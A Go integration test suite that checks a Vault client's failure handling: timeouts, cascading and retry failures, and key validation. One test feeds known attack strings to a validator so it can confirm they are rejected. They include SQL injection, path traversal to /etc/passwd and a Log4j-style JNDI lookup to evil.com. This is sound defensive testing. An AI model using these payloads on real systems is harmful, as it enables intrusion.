// +build integration

package vault

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
)

func TestExtendedIntegrationNegative(t *testing.T) {
	RegisterFailHandler(Fail)
	RunSpecs(t, "Extended Integration Negative Test Suite")
}

var _ = Describe("Extended Integration Negative Tests", func() {
	Describe("Client Failure Scenarios", func() {
		It("should handle complete client failures gracefully", func() {
			factory := NewMockClientFactory()
			factory.SetFailNew(true) // Force factory to fail

			client, err := factory.NewClient("http://failing-factory:8200", false, 30*time.Second)
			Expect(err).To(HaveOccurred())
			Expect(client).To(BeNil())
			Expect(err.Error()).To(ContainSubstring("mock client factory error"))
		})

		It("should handle persistent service failures", func() {
			factory := NewMockClientFactory()
			client, err := factory.NewClient("http://persistent-fail:8200", false, 30*time.Second)
			Expect(err).ToNot(HaveOccurred())
			defer client.Close()

			mockClient := factory.GetClient("http://persistent-fail:8200")
			// Set all operations to fail
			mockClient.SetFailSealStatus(true)
			mockClient.SetFailHealthCheck(true)
			mockClient.SetFailUnseal(true)
			mockClient.SetFailInitialized(true)

			ctx := context.Background()

			// All operations should fail
			_, err = client.IsSealed(ctx)
			Expect(err).To(HaveOccurred())

			_, err = client.HealthCheck(ctx)
			Expect(err).To(HaveOccurred())

			_, err = client.IsInitialized(ctx)
			Expect(err).To(HaveOccurred())

			keys := []string{base64.StdEncoding.EncodeToString([]byte("test-key"))}
			_, err = client.Unseal(ctx, keys, 1)
			Expect(err).To(HaveOccurred())
		})

		It("should handle network timeout scenarios", func() {
			factory := NewMockClientFactory()
			client, err := factory.NewClient("http://timeout-test:8200", false, 50*time.Millisecond)
			Expect(err).ToNot(HaveOccurred())
			defer client.Close()

			mockClient := factory.GetClient("http://timeout-test:8200")
			mockClient.SetResponseDelay(100 * time.Millisecond) // Longer than client timeout

			ctx, cancel := context.WithTimeout(context.Background(), 25*time.Millisecond)
			defer cancel()

			// Operations should fail due to timeout
			start := time.Now()
			_, err = client.IsSealed(ctx)
			duration := time.Since(start)

			Expect(err).To(HaveOccurred())
			Expect(duration).To(BeNumerically("<", 75*time.Millisecond), "Should timeout quickly")
		})
	})

	Describe("Multi-Client Failure Coordination", func() {
		It("should handle cascading failures across multiple clients", func() {
			factory := NewMockClientFactory()
			numClients := 5
			clients := make([]VaultClient, numClients)
			mockClients := make([]*MockVaultClient, numClients)

			// Set up clients with progressive failure delays
			for i := 0; i < numClients; i++ {
				endpoint := fmt.Sprintf("http://cascade-%d:8200", i)
				client, err := factory.NewClient(endpoint, false, 30*time.Second)
				Expect(err).ToNot(HaveOccurred())

				clients[i] = client
				mockClients[i] = factory.GetClient(endpoint)
				mockClients[i].SetHealthy(true)
			}

			ctx := context.Background()

			// Simulate cascading failures
			go func() {
				for i := 0; i < numClients; i++ {
					time.Sleep(time.Duration(i*10) * time.Millisecond)
					mockClients[i].SetFailSealStatus(true)
					mockClients[i].SetFailHealthCheck(true)
				}
			}()

			// Test operations with increasing failures
			var wg sync.WaitGroup
			results := make([]error, numClients)

			for i := 0; i < numClients; i++ {
				wg.Add(1)
				go func(index int) {
					defer wg.Done()
					time.Sleep(time.Duration(index*15) * time.Millisecond) // Staggered start
					_, err := clients[index].HealthCheck(ctx)
					results[index] = err
				}(i)
			}

			wg.Wait()

			// Later clients should be more likely to fail
			failureCount := 0
			for _, err := range results {
				if err != nil {
					failureCount++
				}
			}

			Expect(failureCount).To(BeNumerically(">", 0), "Should have some failures from cascade")

			// Cleanup
			for _, client := range clients {
				client.Close()
			}
		})

		It("should handle resource exhaustion scenarios", func() {
			factory := NewMockClientFactory()

			// Create many clients to simulate resource pressure
			numClients := 100
			clients := make([]VaultClient, numClients)

			// Some clients will fail to create due to simulated resource pressure
			factory.SetFailNew(false)

			for i := 0; i < numClients; i++ {
				endpoint := fmt.Sprintf("http://resource-pressure-%d:8200", i)

				// Simulate intermittent factory failures due to resource pressure
				if i > 50 {
					factory.SetFailNew(i%3 == 0) // 33% failure rate for later clients
				}

				client, err := factory.NewClient(endpoint, false, 10*time.Millisecond)
				if err != nil {
					clients[i] = nil // Mark as failed
					continue
				}
				clients[i] = client
			}

			// Count successful vs failed client creations
			successCount := 0
			failureCount := 0
			for _, client := range clients {
				if client != nil {
					successCount++
				} else {
					failureCount++
				}
			}

			Expect(failureCount).To(BeNumerically(">", 0), "Should have some resource-related failures")
			Expect(successCount).To(BeNumerically(">", numClients/2), "Should still have majority success")

			// Cleanup successful clients
			for _, client := range clients {
				if client != nil {
					client.Close()
				}
			}
		})
	})

	Describe("Strategy Failure Scenarios", func() {
		It("should handle validation failures in complex scenarios", func() {
			validator := NewStrictKeyValidator(64)
			validator.SetForbiddenStrings([]string{"forbidden", "invalid", "bad"})
			metrics := NewMockClientMetrics()
			strategy := NewDefaultUnsealStrategy(validator, metrics)

			mockClient := NewMockVaultClient()
			mockClient.SetSealed(true)

			// Test various invalid key scenarios
			invalidScenarios := []struct {
				name string
				keys []string
			}{
				{"short_key", []string{base64.StdEncoding.EncodeToString([]byte("short"))}},
				{"forbidden_content", []string{base64.StdEncoding.EncodeToString([]byte(strings.Repeat("forbidden-content", 5)))}},
				{"mixed_valid_invalid", []string{
					base64.StdEncoding.EncodeToString(make([]byte, 64)),
					"invalid-base64!@#",
				}},
				{"all_invalid", []string{"not-base64", "also-not-base64", "definitely-not"}},
			}

			for _, scenario := range invalidScenarios {
				_, err := strategy.Unseal(context.Background(), mockClient, scenario.keys, 1)
				Expect(err).To(HaveOccurred(), "Scenario %s should fail", scenario.name)
				Expect(IsValidationError(err) || strings.Contains(err.Error(), "validation")).To(BeTrue(),
					"Scenario %s should be validation error", scenario.name)
			}
		})

		It("should handle strategy failures under concurrent load", func() {
			validator := NewDefaultKeyValidator()
			metrics := NewMockClientMetrics()
			baseStrategy := NewDefaultUnsealStrategy(validator, metrics)

			retryPolicy := &DefaultRetryPolicy{
				maxAttempts: 2, // Low retry count to force failures
				baseDelay:   1 * time.Millisecond,
				maxDelay:    5 * time.Millisecond,
			}
			retryStrategy := NewRetryUnsealStrategy(baseStrategy, retryPolicy)

			numWorkers := 20
			keys := []string{base64.StdEncoding.EncodeToString([]byte("concurrent-key"))}

			var wg sync.WaitGroup
			failures := make([]error, numWorkers)

			for i := 0; i < numWorkers; i++ {
				wg.Add(1)
				go func(index int) {
					defer wg.Done()

					mockClient := NewMockVaultClient()
					mockClient.SetSealed(true)
					mockClient.SetFailSealStatus(true) // Persistent failure

					_, err := retryStrategy.Unseal(context.Background(), mockClient, keys, 1)
					failures[index] = err
				}(i)
			}

			wg.Wait()

			// All operations should fail due to persistent mock failures
			failureCount := 0
			for _, err := range failures {
				if err != nil {
					failureCount++
				}
			}

			Expect(failureCount).To(Equal(numWorkers), "All operations should fail under persistent failure")
		})

		It("should handle context cancellation during complex operations", func() {
			validator := NewDefaultKeyValidator()
			metrics := NewMockClientMetrics()
			strategy := NewDefaultUnsealStrategy(validator, metrics)

			mockClient := NewMockVaultClient()
			mockClient.SetSealed(true)
			mockClient.SetResponseDelay(100 * time.Millisecond) // Slow responses

			keys := []string{base64.StdEncoding.EncodeToString([]byte("cancellation-key"))}

			// Test various cancellation timings
			cancellationTests := []time.Duration{
				1 * time.Millisecond,   // Very quick cancellation
				50 * time.Millisecond,  // Mid-operation cancellation
				150 * time.Millisecond, // After operation would complete
			}

			for i, timeout := range cancellationTests {
				ctx, cancel := context.WithTimeout(context.Background(), timeout)

				start := time.Now()
				_, err := strategy.Unseal(ctx, mockClient, keys, 1)
				duration := time.Since(start)
				cancel()

				if timeout < 90*time.Millisecond { // Should timeout before operation completes
					Expect(err).To(HaveOccurred(), "Test %d should fail due to cancellation", i)
					Expect(duration).To(BeNumerically("<=", timeout+10*time.Millisecond),
						"Test %d should respect context timeout", i)
				}
			}
		})
	})

	Describe("Error Handling and Recovery Failures", func() {
		It("should handle persistent retry failures", func() {
			validator := NewDefaultKeyValidator()
			metrics := NewMockClientMetrics()
			baseStrategy := NewDefaultUnsealStrategy(validator, metrics)

			retryPolicy := &DefaultRetryPolicy{
				maxAttempts: 5,
				baseDelay:   1 * time.Millisecond,
				maxDelay:    5 * time.Millisecond,
			}
			retryStrategy := NewRetryUnsealStrategy(baseStrategy, retryPolicy)

			mockClient := NewMockVaultClient()
			mockClient.SetSealed(true)
			mockClient.SetFailSealStatus(true) // Will never recover

			keys := []string{base64.StdEncoding.EncodeToString([]byte("persistent-failure-key"))}

			start := time.Now()
			_, err := retryStrategy.Unseal(context.Background(), mockClient, keys, 1)
			duration := time.Since(start)

			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("failed after"))
			Expect(mockClient.GetCallCount("GetSealStatus")).To(Equal(5)) // All retries used

			// Should have taken time for retries with maxDelay cap
			// baseDelay=1ms, maxDelay=5ms: delays are 1+2+4+5+5 = 17ms but allow some variance
			expectedMinDuration := time.Duration(10) * time.Millisecond // Allow for timing variance
			Expect(duration).To(BeNumerically(">=", expectedMinDuration))
		})

		It("should handle mixed failure and recovery patterns", func() {
			factory := NewMockClientFactory()
			client, err := factory.NewClient("http://mixed-patterns:8200", false, 100*time.Millisecond)
			Expect(err).ToNot(HaveOccurred())
			defer client.Close()

			mockClient := factory.GetClient("http://mixed-patterns:8200")
			ctx := context.Background()

			// Pattern: fail -> succeed -> fail -> succeed -> permanent fail
			pattern := []bool{true, false, true, false, true}
			results := make([]error, len(pattern))

			for i, shouldFail := range pattern {
				mockClient.Reset()
				if shouldFail {
					mockClient.SetFailHealthCheck(true)
				} else {
					mockClient.SetHealthy(true)
				}

				_, err := client.HealthCheck(ctx)
				results[i] = err

				// Small delay between operations
				time.Sleep(5 * time.Millisecond)
			}

			// Verify the failure pattern matches expectations
			for i, expectedFail := range pattern {
				if expectedFail {
					Expect(results[i]).To(HaveOccurred(), "Operation %d should fail", i)
				} else {
					Expect(results[i]).ToNot(HaveOccurred(), "Operation %d should succeed", i)
				}
			}
		})

		It("should handle error propagation in complex client hierarchies", func() {
			// Create a chain of clients with different failure modes
			factory := NewMockClientFactory()

			chainLength := 5
			clients := make([]VaultClient, chainLength)
			mockClients := make([]*MockVaultClient, chainLength)

			for i := 0; i < chainLength; i++ {
				endpoint := fmt.Sprintf("http://chain-%d:8200", i)
				client, err := factory.NewClient(endpoint, false, 20*time.Millisecond)
				Expect(err).ToNot(HaveOccurred())

				clients[i] = client
				mockClients[i] = factory.GetClient(endpoint)
			}

			// Configure different failure modes for each client
			mockClients[0].SetFailSealStatus(true)
			mockClients[1].SetFailSealStatus(true) // Should also fail IsSealed calls
			mockClients[2].SetFailSealStatus(true) // Should also fail IsSealed calls
			mockClients[3].SetResponseDelay(50 * time.Millisecond) // Timeout
			mockClients[4].SetHealthy(true) // Only this one works

			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Millisecond)
			defer cancel()

			// Test operations across the chain
			var wg sync.WaitGroup
			results := make([]error, chainLength)

			for i := 0; i < chainLength; i++ {
				wg.Add(1)
				go func(index int) {
					defer wg.Done()
					_, err := clients[index].IsSealed(ctx)
					results[index] = err
				}(i)
			}

			wg.Wait()

			// Most should fail, only the last should succeed
			failureCount := 0
			for i, err := range results {
				if err != nil {
					failureCount++
				} else if i != chainLength-1 {
					Fail(fmt.Sprintf("Client %d should have failed but succeeded", i))
				}
			}

			Expect(failureCount).To(BeNumerically(">=", chainLength-1),
				"Most clients should fail with only the last succeeding")

			// Cleanup
			for _, client := range clients {
				client.Close()
			}
		})
	})

	Describe("Security and Validation Failure Scenarios", func() {
		It("should reject and handle malicious input patterns", func() {
			validator := NewDefaultKeyValidator()

			maliciousInputs := []string{
				strings.Repeat("A", 100000), // Extremely large input
				"%s%s%s%s%s",                // Format string attack patterns
				"'; DROP TABLE users; --",   // SQL injection patterns
				"\x00\x01\x02\x03",         // Binary control characters
				"../../../etc/passwd",       // Path traversal patterns
				"${jndi:ldap://evil.com/}", // Log4j-style injection
			}

			for _, maliciousInput := range maliciousInputs {
				err := validator.ValidateKeys([]string{maliciousInput}, 1)
				Expect(err).To(HaveOccurred(), "Should reject malicious input: %s", maliciousInput)
			}
		})

		It("should handle sensitive data exposure prevention", func() {
			validator := NewDefaultKeyValidator()

			sensitiveKeys := []string{
				"password123",
				"admin-secret-key",
				"root-credentials",
				"token-sensitive-data",
			}

			for _, sensitiveKey := range sensitiveKeys {
				err := validator.ValidateKeys([]string{sensitiveKey}, 1)

				if err != nil {
					// Error message should not contain the sensitive key
					errorMsg := strings.ToLower(err.Error())
					Expect(errorMsg).ToNot(ContainSubstring(strings.ToLower(sensitiveKey)),
						"Error should not leak sensitive key: %s", sensitiveKey)
					Expect(errorMsg).To(ContainSubstring("[redacted]"),
						"Error should show redacted placeholder")
				}
			}
		})

		It("should handle concurrent security validation failures", func() {
			validator := NewStrictKeyValidator(32)
			validator.SetForbiddenStrings([]string{"forbidden", "banned", "prohibited"})

			numWorkers := 10
			var wg sync.WaitGroup
			results := make([]error, numWorkers)

			// Each worker tries different forbidden patterns
			forbiddenPatterns := []string{
				"forbidden-data-here",
				"this-is-banned-content",
				"prohibited-key-material",
				"another-forbidden-key",
				"banned-secret-data",
			}

			for i := 0; i < numWorkers; i++ {
				wg.Add(1)
				go func(index int) {
					defer wg.Done()

					pattern := forbiddenPatterns[index%len(forbiddenPatterns)]
					keyData := make([]byte, 32)
					copy(keyData, pattern)
					key := base64.StdEncoding.EncodeToString(keyData)

					err := validator.ValidateKeys([]string{key}, 1)
					results[index] = err
				}(i)
			}

			wg.Wait()

			// All should fail validation
			for i, err := range results {
				Expect(err).To(HaveOccurred(), "Worker %d should fail validation", i)
				Expect(err.Error()).To(ContainSubstring("forbidden"),
					"Worker %d should fail with forbidden string error", i)
			}
		})
	})

	Describe("System Boundary Failure Tests", func() {
		It("should handle extreme configuration edge cases", func() {
			extremeConfigs := []*ClientConfig{
				{URL: "", Timeout: -1 * time.Second}, // Negative timeout, empty URL
				{URL: "http://test:8200", MaxRetries: -100}, // Negative retries
				{URL: strings.Repeat("http://very-long-url", 1000), Timeout: time.Nanosecond}, // Extremely long URL, tiny timeout
			}

			for i, config := range extremeConfigs {
				client, err := NewClientWithConfig(config)
				Expect(err).To(HaveOccurred(), "Extreme config %d should be rejected", i)
				Expect(client).To(BeNil())
			}
		})

		It("should handle system resource limit scenarios", func() {
			// Test with extreme values that might cause resource issues
			validator := NewStrictKeyValidator(1024) // Very large key requirement

			// Try to validate extremely large key sets
			largeKeySet := make([]string, 10000) // Very large number of keys
			for i := range largeKeySet {
				largeKeySet[i] = "invalid-key" // All invalid to stress error handling
			}

			err := validator.ValidateKeys(largeKeySet, 5000) // Large threshold
			Expect(err).To(HaveOccurred(), "Large invalid key set should be rejected")

			// The validation should fail quickly without consuming excessive resources
			start := time.Now()
			validator.ValidateKeys(largeKeySet[:100], 50) // Smaller subset
			duration := time.Since(start)

			Expect(duration).To(BeNumerically("<", 1*time.Second),
				"Validation should fail quickly even for large sets")
		})

		It("should handle memory pressure during failures", func() {
			factory := NewMockClientFactory()

			// Create many failing clients to test memory management under failure
			numClients := 50
			clients := make([]VaultClient, numClients)

			for i := 0; i < numClients; i++ {
				endpoint := fmt.Sprintf("http://memory-pressure-fail-%d:8200", i)
				client, err := factory.NewClient(endpoint, false, 10*time.Millisecond)
				Expect(err).ToNot(HaveOccurred())
				clients[i] = client

				mockClient := factory.GetClient(endpoint)
				// All clients fail all operations
				mockClient.SetFailSealStatus(true)
				mockClient.SetFailHealthCheck(true)
				mockClient.SetFailUnseal(true)
			}

			// Perform many failing operations
			ctx := context.Background()
			for round := 0; round < 10; round++ {
				var wg sync.WaitGroup

				for _, client := range clients {
					wg.Add(1)
					go func(c VaultClient) {
						defer wg.Done()
						_, _ = c.IsSealed(ctx)      // Ignore errors, just create memory pressure
						_, _ = c.HealthCheck(ctx)
						_, _ = c.IsInitialized(ctx)
					}(client)
				}

				wg.Wait()
				// Force garbage collection to test memory cleanup
				time.Sleep(time.Millisecond)
			}

			// Cleanup - should not cause memory leaks or panics
			for _, client := range clients {
				client.Close()
			}
		})
	})
})
